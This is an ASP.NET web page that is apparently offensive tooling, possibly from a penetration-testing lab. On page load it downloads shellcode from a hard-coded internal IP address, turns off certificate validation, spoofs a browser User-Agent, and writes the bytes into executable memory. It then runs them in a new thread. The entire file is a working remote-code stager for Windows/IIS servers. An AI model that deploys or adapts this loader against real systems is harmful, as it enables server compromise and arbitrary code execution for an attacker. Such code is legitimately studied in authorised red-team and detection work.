<%@ Page Language="C#" %>
<%@ Import Namespace="System" %>
<%@ Import Namespace="System.Runtime.InteropServices" %>
<%@ Import Namespace="System.Net" %>
<script runat="server">
    [DllImport("kernel32.dll", SetLastError = true)]
    static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);

    protected void Page_Load(object sender, EventArgs e) {
        try {
            // Download shellcode dynamically
            ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
            ServicePointManager.ServerCertificateValidationCallback = delegate { return true; };

            using (WebClient wc = new WebClient()) {
                wc.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)");

                byte[] buf = wc.DownloadData("http://192.168.45.161/stagsc.bin");

                if (buf == null || buf.Length == 0) {
                    Response.Write("Download failed");
                    return;
                }

                // Allocate memory
                IntPtr mem = VirtualAlloc(IntPtr.Zero, (uint)buf.Length, 0x3000, 0x40);
                if (mem == IntPtr.Zero) {
                    Response.Write("Memory allocation failed");
                    return;
                }

                // Copy shellcode
                Marshal.Copy(buf, 0, mem, buf.Length);

                // Create thread
                IntPtr hThread = CreateThread(IntPtr.Zero, 0, mem, IntPtr.Zero, 0, IntPtr.Zero);
                if (hThread == IntPtr.Zero) {
                    Response.Write("Thread creation failed");
                    return;
                }

                // Don't wait - let it run async
                Response.Write("Executed");
            }
        } catch (Exception ex) {
            Response.Write("Error: " + ex.Message);
        }
    }
</script>